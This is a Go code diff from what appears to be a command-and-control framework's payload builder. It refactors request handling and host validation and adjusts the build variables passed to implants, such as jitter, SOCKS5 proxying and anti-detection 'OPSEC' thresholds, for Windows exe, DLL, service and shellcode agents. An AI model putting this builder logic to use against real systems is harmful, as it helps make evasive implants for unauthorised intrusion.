@@ -394,8 +394,8 @@ func (h *PayloadHandler) HandleGeneratePayload(w http.ResponseWriter, r *http.Re
 		return
 	}
 
-	var config PayloadConfig
-	if err := decodePayloadRequest(w, r, &config); err != nil {
+	config, err := decodePayloadConfigRequest(w, r)
+	if err != nil {
 		var maxBytesError *http.MaxBytesError
 		if errors.As(err, &maxBytesError) {
 			http.Error(
@@ -438,6 +438,17 @@ func (h *PayloadHandler) HandleGeneratePayload(w http.ResponseWriter, r *http.Re
 	json.NewEncoder(w).Encode(response)
 }
 
+func decodePayloadConfigRequest(
+	w http.ResponseWriter,
+	r *http.Request,
+) (PayloadConfig, error) {
+	config := defaultPayloadRequestConfig()
+	if err := decodePayloadRequest(w, r, &config); err != nil {
+		return PayloadConfig{}, err
+	}
+	return config, nil
+}
+
 func resolvedPayloadMaxSessions(configured int) (int, error) {
 	if configured == 0 {
 		return defaultPayloadMaxSessions, nil
@@ -473,59 +484,7 @@ func decodePayloadRequest(
 }
 
 func normalizeAdvertisedHost(value string) (string, error) {
-	if value == "" {
-		return "", errors.New("advertised host is required")
-	}
-	if value != strings.TrimSpace(value) {
-		return "", errors.New("advertised host must not contain surrounding whitespace")
-	}
-
-	host := value
-	bracketed := false
-	if strings.HasPrefix(host, "[") || strings.HasSuffix(host, "]") {
-		if !strings.HasPrefix(host, "[") || !strings.HasSuffix(host, "]") {
-			return "", errors.New("advertised host has mismatched IPv6 brackets")
-		}
-		bracketed = true
-		host = strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
-	}
-	if ip := net.ParseIP(host); ip != nil {
-		if ip.IsUnspecified() {
-			return "", errors.New(
-				"advertised host must not be an unspecified address; configure listener hosts[0]",
-			)
-		}
-		return host, nil
-	}
-	if bracketed {
-		return "", errors.New("only an IPv6 address may use host brackets")
-	}
-
-	name := strings.TrimSuffix(host, ".")
-	if name == "" || len(host) > 253 {
-		return "", errors.New("advertised host is not a valid DNS name or IP address")
-	}
-	for _, label := range strings.Split(name, ".") {
-		if len(label) == 0 || len(label) > 63 ||
-			!isASCIIAlphaNumeric(label[0]) ||
-			!isASCIIAlphaNumeric(label[len(label)-1]) {
-			return "", errors.New("advertised host is not a valid DNS name or IP address")
-		}
-		for index := 1; index < len(label)-1; index++ {
-			if !isASCIIAlphaNumeric(label[index]) && label[index] != '-' {
-				return "", errors.New(
-					"advertised host is not a valid DNS name or IP address",
-				)
-			}
-		}
-	}
-	return host, nil
-}
-
-func isASCIIAlphaNumeric(value byte) bool {
-	return value >= 'a' && value <= 'z' ||
-		value >= 'A' && value <= 'Z' ||
-		value >= '0' && value <= '9'
+	return listeners.NormalizeAdvertisedHost(value)
 }
 
 func advertisedListenerEndpoint(
@@ -1602,6 +1561,7 @@ func (h *PayloadHandler) GeneratePayloadWithContext(
 		fmt.Sprintf("LISTENER_ID=%s", listener.ID),
 		fmt.Sprintf("PAYLOAD_ID=%s", payloadID),
 		fmt.Sprintf("SLEEP_INTERVAL=%d", config.Sleep),
+		fmt.Sprintf("JITTER=%d", payloadBuildJitterSeconds),
 		fmt.Sprintf("SOCKS5_ENABLED=%t", config.Socks5Enabled),
 		fmt.Sprintf("SOCKS5_HOST=%s", config.Socks5Host),
 		fmt.Sprintf("SOCKS5_PORT=%d", config.Socks5Port),
@@ -1615,17 +1575,22 @@ func (h *PayloadHandler) GeneratePayloadWithContext(
 
 		// Add OPSEC ENV VARS
 		fmt.Sprintf("PROC_SCAN_INTERVAL_SECS=%d", config.ProcScanIntervalSecs),
-		fmt.Sprintf("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL=%.1f", config.BaseThresholdEnterFullOpsec),
-		fmt.Sprintf("BASE_SCORE_THRESHOLD_BG_TO_REDUCED=%.1f", config.BaseThresholdEnterReducedActivity),
+		"BASE_SCORE_THRESHOLD_REDUCED_TO_FULL="+
+			formatRustF32(config.BaseThresholdEnterFullOpsec),
+		"BASE_SCORE_THRESHOLD_BG_TO_REDUCED="+
+			formatRustF32(config.BaseThresholdEnterReducedActivity),
 		fmt.Sprintf("MIN_FULL_OPSEC_SECS=%d", config.MinDurationFullOpsecSecs),
 		fmt.Sprintf("MIN_REDUCED_OPSEC_SECS=%d", config.MinDurationReducedActivitySecs),
 		fmt.Sprintf("MIN_BG_OPSEC_SECS=%d", config.MinDurationBackgroundOpsecSecs),
 		fmt.Sprintf("REDUCED_ACTIVITY_SLEEP_SECS=%d", config.ReducedActivitySleepSecs),
 		fmt.Sprintf("BASE_MAX_C2_FAILS=%d", config.BaseMaxConsecutiveC2Failures),
-		fmt.Sprintf("C2_THRESH_INC_FACTOR=%.2f", config.C2FailureThresholdIncreaseFactor),
-		fmt.Sprintf("C2_THRESH_DEC_FACTOR=%.2f", config.C2FailureThresholdDecreaseFactor),
+		"C2_THRESH_INC_FACTOR="+
+			formatRustF32(config.C2FailureThresholdIncreaseFactor),
+		"C2_THRESH_DEC_FACTOR="+
+			formatRustF32(config.C2FailureThresholdDecreaseFactor),
 		fmt.Sprintf("C2_THRESH_ADJ_INTERVAL=%d", config.C2ThresholdAdjustIntervalSecs),
-		fmt.Sprintf("C2_THRESH_MAX_MULT=%.1f", config.C2DynamicThresholdMaxMultiplier),
+		"C2_THRESH_MAX_MULT="+
+			formatRustF32(config.C2DynamicThresholdMaxMultiplier),
 	)
 
 	log.Printf("[INFO] Environment variables set: TARGET=%s, OUTPUT_DIR=%s, BUILD_TYPE=%s, SLEEP_INTERVAL=%d, SOCKS5_ENABLED=%t, SOCKS5_PORT=%d",
@@ -2533,21 +2498,6 @@ func (h *PayloadHandler) openVerifiedPayload(
 		return closeAsCorrupt("artifact changed during verification")
 	}
 	return file, payloadStateCompleted, "", actualHash
-}
-
-func payloadFilename(format string) string {
-	switch format {
-	case "windows_exe":
-		return "agent.exe"
-	case "windows_dll":
-		return "agent.dll"
-	case "windows_service":
-		return "agent_service.exe"
-	case "windows_shellcode":
-		return "shellcode.bin"
-	default:
-		return "agent"
-	}
 }
 
 func (h *PayloadHandler) relativeArtifactPath(artifactPath string) (string, error) {
